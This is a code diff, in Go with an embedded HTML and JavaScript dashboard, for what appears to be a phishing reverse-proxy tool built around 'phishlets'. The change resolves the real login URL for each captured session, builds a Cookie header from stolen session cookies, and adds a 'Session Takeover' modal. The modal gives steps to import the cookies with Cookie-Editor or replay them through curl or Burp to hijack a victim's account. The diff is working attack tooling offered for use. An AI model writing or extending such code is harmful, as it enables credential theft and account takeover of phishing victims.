@@ -26,15 +26,16 @@ type DashboardConfig struct {
 
 // DashboardServer manages the HTTP server and session data for the web dashboard.
 type DashboardServer struct {
-	config   *DashboardConfig
-	db       *database.Database
-	server   *http.Server
-	mu       sync.RWMutex
-	sessions []*database.Session
+	config     *DashboardConfig
+	db         *database.Database
+	phishCfg   *Config
+	server     *http.Server
+	mu         sync.RWMutex
+	sessions   []*database.Session
 }
 
 // NewDashboardServer creates a new dashboard server instance.
-func NewDashboardServer(cfg *DashboardConfig, db *database.Database) (*DashboardServer, error) {
+func NewDashboardServer(cfg *DashboardConfig, db *database.Database, phishCfg *Config) (*DashboardServer, error) {
 	if cfg == nil {
 		return nil, fmt.Errorf("dashboard: config is nil")
 	}
@@ -42,8 +43,9 @@ func NewDashboardServer(cfg *DashboardConfig, db *database.Database) (*Dashboard
 		return nil, fmt.Errorf("dashboard: database reference is nil")
 	}
 	return &DashboardServer{
-		config: cfg,
-		db:     db,
+		config:   cfg,
+		db:       db,
+		phishCfg: phishCfg,
 	}, nil
 }
 
@@ -407,21 +409,37 @@ func (ds *DashboardServer) handleAPICookies(w http.ResponseWriter, r *http.Reque
 		}
 	}
 
-	// Infer the target login URL from cookie domains
+	// Resolve the target login URL from the phishlet config if available.
 	targetURL := ""
-	for domain := range target.CookieTokens {
-		clean := strings.TrimPrefix(domain, ".")
-		targetURL = "https://" + clean
-		break
+	if ds.phishCfg != nil {
+		if pl, err := ds.phishCfg.GetPhishlet(target.Phishlet); err == nil {
+			targetURL = pl.GetLoginUrl()
+		}
 	}
+	if targetURL == "" {
+		// Fallback: use the first cookie domain as a best-effort target.
+		for domain := range target.CookieTokens {
+			clean := strings.TrimPrefix(domain, ".")
+			targetURL = "https://" + clean
+			break
+		}
+	}
+
+	// Build a Cookie header string for use with curl / Burp.
+	cookieHeaderParts := make([]string, 0, len(cookies))
+	for _, c := range cookies {
+		cookieHeaderParts = append(cookieHeaderParts, c.Name+"="+c.Value)
+	}
+	cookieHeader := strings.Join(cookieHeaderParts, "; ")
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
-		"session_id": id,
-		"phishlet":   target.Phishlet,
-		"cookies":    cookies,
-		"target_url": targetURL,
-		"count":      len(cookies),
+		"session_id":    id,
+		"phishlet":      target.Phishlet,
+		"cookies":       cookies,
+		"target_url":    targetURL,
+		"count":         len(cookies),
+		"cookie_header": cookieHeader,
 	})
 }
 
@@ -681,26 +699,31 @@ tbody tr.selected{background:rgba(88,166,255,.06)}
 
   <!-- Inject modal -->
   <div id="injectModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9000;align-items:center;justify-content:center">
-    <div style="background:var(--surf);border:1px solid var(--border);border-radius:8px;max-width:480px;width:90%;padding:24px">
+    <div style="background:var(--surf);border:1px solid var(--border);border-radius:8px;max-width:520px;width:90%;padding:24px">
       <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
         <h3 style="font-size:14px;font-weight:600">Session Takeover</h3>
         <button class="btn btn-sm" onclick="closeInjectModal()">Close</button>
       </div>
       <div style="background:var(--green-bg);border:1px solid var(--green);border-radius:6px;padding:12px;margin-bottom:16px">
-        <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">Cookie file downloaded</div>
+        <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">&#10003; Cookie file downloaded</div>
         <div style="color:var(--text);font-size:12px" id="injectCookieCount"></div>
       </div>
-      <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.7">
-        <b style="color:var(--text)">Steps to take over this session:</b><br>
+      <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.8">
+        <b style="color:var(--text)">Browser import (Cookie-Editor):</b><br>
         1. Install the <b>Cookie-Editor</b> browser extension<br>
-        2. Click <b>Open Target Site</b> below<br>
-        3. On that tab, open Cookie-Editor<br>
-        4. Click <b>Import</b> and paste or load the downloaded JSON<br>
-        5. Reload the page
+        2. Click <b>Open Target Site</b> — a new tab opens on the real site<br>
+        3. On that tab, open Cookie-Editor &rarr; click <b>Import</b><br>
+        4. Paste the downloaded JSON and confirm &rarr; Reload the page
+      </div>
+      <div style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.8">
+        <b style="color:var(--text)">Curl / Burp (raw header):</b><br>
+        Click <b>Copy Cookie Header</b> then use:<br>
+        <code style="font-size:11px;color:var(--text)">curl -b "..." https://target</code>
       </div>
       <div style="display:flex;gap:8px;flex-wrap:wrap">
         <button class="btn btn-green" id="openTargetBtn" onclick="openTargetSite()">Open Target Site</button>
-        <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download Cookies</button>
+        <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
+        <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download JSON</button>
       </div>
     </div>
   </div>
@@ -1134,6 +1157,12 @@ function downloadCookieFile(data) {
 
 function reDownloadCookies() {
   if (injectData) downloadCookieFile(injectData);
+}
+
+function copyCookieHeader() {
+  if (!injectData || !injectData.cookie_header) { toast('No cookie header available', 'err'); return; }
+  copyToClipboard(injectData.cookie_header);
+  toast('Cookie header copied', 'info');
 }
 
 function openTargetSite() {
